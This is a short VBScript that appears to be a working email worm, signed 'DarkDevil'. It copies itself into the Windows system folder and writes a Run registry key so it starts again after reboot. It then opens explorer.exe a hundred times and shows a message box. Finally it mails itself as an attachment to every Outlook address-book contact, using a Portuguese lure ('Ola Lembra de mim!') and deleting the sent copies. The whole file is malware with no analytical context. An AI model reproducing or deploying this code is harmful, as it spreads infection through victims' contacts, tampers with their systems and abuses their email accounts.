   On Error Resume Next
   Dim Outlook, MAPI, ListaEndereco, NumeroEnderco, Mensagem
   Set Outlook = CreateObject( "Outlook.Application" )
   Set MAPI = Outlook.GetNameSpace( "MAPI" )
   Set FNC_ARQ = createobject("scripting.filesystemobject")
   Set FNC_SHELL = createobject("wscript.shell")
   FNC_ARQ.Copyfile wscript.scriptfullname, FNC_ARQ.getspecialfolder(1) & "\Grasiele.VBS"
   FNC_SHELL.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\DarkDevil.Grasiele.BR", FNC_ARQ.getspecialfolder(1) & "\Grasiele.VBS"
   for X=1 to 100
   FNC_SHELL.run(FNC_ARQ.getspecialfolder(0) & "\explorer.exe")
   next
   MSGBOX "Eu Amo a Grasiele!", 64 ,"DarkDevil"
   For Each ListaEndereco In MAPI.AddressLists
   For NumeroEnderco = 1 To ListaEndereco.AddressEntries.Count
   Set Mensagem = Outlook.CreateItem( 0 )
   Mensagem.BCC = ListaEndereco.AddressEntries( NumeroEnderco ).Address
   Mensagem.Subject = "Ola Lembra de mim!"
   Mensagem.Body = "Estou com saudades."
    Mensagem.Attachments.Add WScript.ScriptFullName
    Mensagem.DeleteAfterSubmit = True
   Mensagem.Send
   Next
   Next
